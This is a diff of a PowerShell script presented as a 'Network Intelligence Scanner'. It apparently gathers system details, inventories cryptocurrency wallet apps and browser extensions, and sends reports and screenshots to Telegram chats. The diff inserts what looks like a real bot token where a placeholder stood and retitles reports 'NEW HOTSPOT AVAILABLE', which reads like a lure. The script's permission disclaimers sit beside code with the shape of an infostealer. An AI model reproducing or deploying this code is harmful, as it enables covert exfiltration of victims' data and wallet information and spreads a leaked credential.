@@ -1,15 +1,30 @@
-# Network Intelligence Scanner v3.6.3 (Windows PowerShell 5.1+)
+# Network Intelligence Scanner v3.6.4 (Windows PowerShell 5.1+)
 # Run only on a computer you own or administer with permission.
 # Public GitHub warning: never publish a working Telegram bot token.
 
 $ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 
+# Non-fatal diagnostics are handled inside each module.
+# Unexpected errors are logged locally so they cannot disappear with the window.
+$script:StartupErrorLog = Join-Path $env:TEMP 'NetworkScanner-startup-errors.log'
+trap {
+    $line = $_.InvocationInfo.ScriptLineNumber
+    $msg = $_.Exception.Message
+    $entry = '[{0}] Line {1}: {2}' -f (Get-Date -Format 's'), $line, $msg
+    try { Add-Content -LiteralPath $script:StartupErrorLog -Value $entry -Encoding UTF8 } catch {}
+    Write-Host $entry -ForegroundColor Red
+    Write-Host ('Error log: ' + $script:StartupErrorLog)
+    try { Read-Host 'Press Enter to close' | Out-Null } catch {}
+    break
+}
+
+
 # ========= EDIT THESE SETTINGS =========
-$botToken = 'PASTE_NEW_BOT_TOKEN_HERE'
+$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
 $chatIds = @('8640543929', '8362186234')
 $enableScreenshotOption = $true # Optional, locally saved screenshot with explicit permission
-$reportTitle = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
+$reportTitle = 'NEW HOTSPOT AVAILABLE'
 # =======================================
 
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
@@ -64,10 +79,11 @@ function Send-TgPhoto([string]$path) {
 $notes = New-Object 'System.Collections.Generic.List[string]'
 $report = [ordered]@{}
 $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
-$reportDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
-if (-not $reportDir) { $reportDir = Join-Path $env:TEMP 'NetworkScannerReports' }
+$documentsDir = [Environment]::GetFolderPath('MyDocuments')
+if ([string]::IsNullOrWhiteSpace($documentsDir)) { $documentsDir = $env:TEMP }
+$reportDir = Join-Path $documentsDir 'NetworkScannerReports'
 New-Item -ItemType Directory -Path $reportDir -Force | Out-Null
-Write-Host 'Network Intelligence Scanner v3.6.3'
+Write-Host 'Network Intelligence Scanner v3.6.4'
 Write-Host 'Collecting local diagnostics. No information is sent without confirmation.'
 
 # Public network
@@ -591,11 +607,13 @@ function Format-InventorySection([string]$title,[string[]]$items) {
     $lis = @($items | ForEach-Object { '<li>' + (Html-Encode $_) + '</li>' }) -join "`n"
     return "<h2>$safeTitle</h2><ul>$lis</ul>"
 }
-$inventoryHtml = @'
+$inventoryHtmlHeader = @'
 <!doctype html><html><head><meta charset="utf-8"><title>Local software inventory</title>
 <style>body{font:16px Segoe UI,Arial,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;background:#111827;color:#e5e7eb}h1,h2{color:#93c5fd}li{margin:6px 0}</style>
 </head><body><h1>Local software inventory</h1>
-'@ + (Format-InventorySection 'Wallet desktop applications' $walletAppsFound) +
+'@
+$inventoryHtml = $inventoryHtmlHeader +
+    (Format-InventorySection 'Wallet desktop applications' $walletAppsFound) +
     (Format-InventorySection 'Wallet Chrome extensions' $walletExtensionsFound) +
     (Format-InventorySection 'Other applications' $otherAppsFound) +
     '<p>Wallet names remain local; ordinary app names are shared only after confirmation.</p></body></html>'
